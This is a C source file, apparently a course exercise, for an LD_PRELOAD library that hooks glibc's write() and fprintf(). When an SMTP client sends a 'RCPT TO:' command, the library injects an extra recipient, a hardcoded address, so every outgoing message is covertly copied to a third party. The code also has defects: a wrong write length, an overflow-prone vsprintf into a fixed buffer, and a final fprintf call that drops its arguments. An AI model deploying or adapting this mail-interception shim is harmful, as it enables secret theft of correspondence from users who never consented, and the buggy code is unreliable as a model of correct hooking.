#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/* Function pointers to hold the value of the glibc functions */
static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
static int (*real_fprintf)(FILE *stream, const char *format, ...) = NULL;

/* wrapping write function call */
ssize_t write(int fd, const void *buf, size_t count)
{
    char RECEPT_TO[] = "RCPT TO:";

    /* printing out the number of characters */
    printf("write:chars#:%lu\n", count);
    /* 
     * resolve the real write function from glibc
     * and pass the arguments.
     */

    real_write = dlsym(RTLD_NEXT, "write");
    real_read = dlsym(RTLD_NEXT, "read");

    //TODO:
    //Check if buffer start with 'RCP TO:'
    char *result = strstr(buf, RECEPT_TO);

    // //If true:
    if (result != NULL)
    {
        char RCPT_PIRATE[] = "RCPT TO: malik.fleury@he-arc.ch\n";
        //Write another RCPT_TO
        real_write(fd, &RCPT_PIRATE, count);

        //If test mode:
        if (fd > 3)
        {
            //Add read RCPT_TO
            char buffer[255];
            ssize_t read_byte;

            if ((read_byte = real_read(fd, buffer, 255)) == -1)
            {
                // perror("read()");
                // close(fd);
                // exit(1);
            }
        }
    }

    //Then real write asked by the smtp client
    return real_write(fd, buf, count);
}

int fprintf(FILE *stream, const char *format, ...)
{
    //Sep
    char buffer[255];
    va_list args;

    va_start(args, format);
    vsprintf(buffer, format, args);
    va_end(args);

    real_fprintf = dlsym(RTLD_NEXT, "fprintf");
    
    char RECEPT_TO[] = "RCPT TO:";
    char *result = strstr(buffer, RECEPT_TO);

    if (result != NULL)
    {
        real_fprintf(stream, "RCPT TO: malik.fleury@he-arc.ch\n");
        fflush(stream);

        char receipt[255];
        do
        {
            fgets(receipt, sizeof(receipt), stream);
            //puts(buffer);
        } while (receipt[0] < '2' || receipt[0] > '5');
    }

    return real_fprintf(stream, format);
}
